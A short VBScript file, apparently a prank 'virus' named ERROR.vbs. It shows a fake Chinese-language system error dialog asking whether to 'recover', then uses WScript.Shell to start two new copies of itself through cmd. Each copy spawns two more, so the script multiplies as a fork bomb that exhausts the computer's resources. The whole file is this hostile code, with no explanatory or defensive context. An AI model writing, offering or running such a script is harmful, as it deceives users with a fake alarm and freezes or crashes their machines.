msgbox"系统出现了一个严重问题！是否尝试恢复？",vbyesno,"警告！"
wscript.sleep"2"
Set obj = createobject("wscript.shell")
obj.run "cmd /c start H:/virus/ERROR.vbs"
obj.run "cmd /c start H:/virus/ERROR.vbs"